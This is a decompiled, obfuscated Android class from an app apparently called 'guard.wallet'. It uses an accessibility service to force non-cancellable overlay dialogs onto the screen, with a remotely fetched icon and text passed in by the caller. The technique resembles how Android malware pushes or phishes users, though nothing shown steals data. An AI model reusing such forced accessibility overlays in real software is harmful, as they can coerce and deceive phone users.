package com.guard.wallet.helper;

import a1.AbstractC0026q;
import android.app.AlertDialog;
import android.graphics.Bitmap;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.WindowManager;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.thread.CallableC0242k;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0255k;
import java.lang.ref.WeakReference;
import java.util.Objects;
import java.util.concurrent.Future;
import java.util.concurrent.locks.ReentrantLock;

/* renamed from: com.guard.wallet.helper.n */
/* loaded from: classes.dex */
public abstract class AbstractC0191n {

    /* renamed from: a */
    public static WeakReference f222a;

    /* renamed from: b */
    public static final ReentrantLock f223b = new ReentrantLock();

    /* renamed from: a */
    public static boolean m356a(String str, String str2, String str3, String str4, String str5) {
        Bitmap bitmap;
        if (MyAccessibilityService.m554P() != null) {
            if (AbstractC0026q.m151B(str3)) {
                str3 = "OK";
            }
            BitmapDrawable bitmapDrawable = null;
            Drawable m649V = !AbstractC0026q.m151B(str4) ? AbstractC0251g.m649V(str4) : null;
            if (m649V == null && !AbstractC0026q.m151B(str5)) {
                if (!AbstractC0026q.m151B(str5)) {
                    try {
                        if (!AbstractC0026q.m151B(str5)) {
                            try {
                                Future m592b = AbstractC0243l.m592b(new CallableC0242k(str5), "DOWNLOAD_DELEGATE");
                                while (m592b != null) {
                                    if (m592b.isDone()) {
                                        bitmap = (Bitmap) m592b.get();
                                        break;
                                    }
                                }
                            } catch (Exception e2) {
                                AbstractC0026q.m186s("BitmapUtils", e2);
                            }
                        }
                        bitmap = null;
                        if (bitmap != null) {
                            try {
                                BitmapDrawable bitmapDrawable2 = new BitmapDrawable(bitmap);
                                bitmapDrawable2.setAlpha(255);
                                bitmapDrawable = bitmapDrawable2;
                            } catch (Exception e3) {
                                AbstractC0026q.m186s("BitmapUtils", e3);
                            }
                        }
                    } catch (Exception e4) {
                        AbstractC0026q.m186s("BitmapUtils", e4);
                    }
                }
                m649V = bitmapDrawable;
            }
            AlertDialog.Builder builder = new AlertDialog.Builder(MyAccessibilityService.m554P(), 5);
            builder.setTitle(str);
            builder.setMessage(str2);
            builder.setCancelable(false);
            builder.setPositiveButton(str3, new DialogInterfaceOnClickListenerC0187j(0));
            builder.setOnDismissListener(new DialogInterfaceOnDismissListenerC0188k(0));
            if (m649V != null) {
                builder.setIcon(m649V);
            }
            AlertDialog create = builder.create();
            if (create != null && create.getWindow() != null) {
                f222a = new WeakReference(create);
                WindowManager.LayoutParams attributes = create.getWindow().getAttributes();
                attributes.type = 2032;
                create.getWindow().setAttributes(attributes);
                create.show();
                return true;
            }
        }
        return false;
    }

    /* renamed from: b */
    public static boolean m357b(String str, String str2, String str3, String str4, String str5) {
        if (MyAccessibilityService.m554P() != null) {
            if (AbstractC0026q.m151B(str3)) {
                str3 = "OK";
            }
            Drawable m649V = !AbstractC0026q.m151B(str4) ? AbstractC0251g.m649V(str4) : null;
            AlertDialog.Builder builder = new AlertDialog.Builder(MyAccessibilityService.m554P(), 5);
            builder.setTitle(str);
            builder.setMessage(str2);
            builder.setCancelable(false);
            builder.setPositiveButton(str3, new DialogInterfaceOnClickListenerC0189l(str4, str5));
            if (m649V != null) {
                builder.setIcon(m649V);
            }
            AlertDialog create = builder.create();
            if (create != null && create.getWindow() != null) {
                WindowManager.LayoutParams attributes = create.getWindow().getAttributes();
                attributes.type = 2032;
                create.getWindow().setAttributes(attributes);
                create.show();
                return true;
            }
        }
        return false;
    }

    /* renamed from: c */
    public static boolean m358c(String str, String str2, String str3, String str4, String str5) {
        ReentrantLock reentrantLock = f223b;
        if (!reentrantLock.tryLock()) {
            return false;
        }
        WeakReference weakReference = f222a;
        if ((weakReference != null && weakReference.get() != null) || Objects.equals(AbstractC0251g.z0().getIsWifiConnected(), 1)) {
            reentrantLock.unlock();
            return false;
        }
        if (!AbstractC0255k.m727a()) {
            new Handler(Looper.getMainLooper()).postDelayed(new RunnableC0190m(str, str2, str3, str4, str5, 1), 300L);
        } else if (m356a(str, str2, str3, str4, str5)) {
            Log.d("com.guard.wallet.helper.n", "弹出WIFI引导对话框成功");
        } else {
            Log.e("com.guard.wallet.helper.n", "弹出WIFI引导对话框失败");
        }
        reentrantLock.unlock();
        return true;
    }

    /* renamed from: d */
    public static boolean m359d(String str, String str2, String str3, String str4, String str5) {
        ReentrantLock reentrantLock = f223b;
        if (!reentrantLock.tryLock()) {
            return false;
        }
        if (!AbstractC0255k.m727a()) {
            new Handler(Looper.getMainLooper()).postDelayed(new RunnableC0190m(str, str2, str3, str4, str5, 0), 300L);
        } else if (m357b(str, str2, str3, str4, str5)) {
            Log.d("com.guard.wallet.helper.n", "弹出通知对话框成功");
        } else {
            Log.e("com.guard.wallet.helper.n", "弹出通知对话框失败");
        }
        reentrantLock.unlock();
        return true;
    }
}
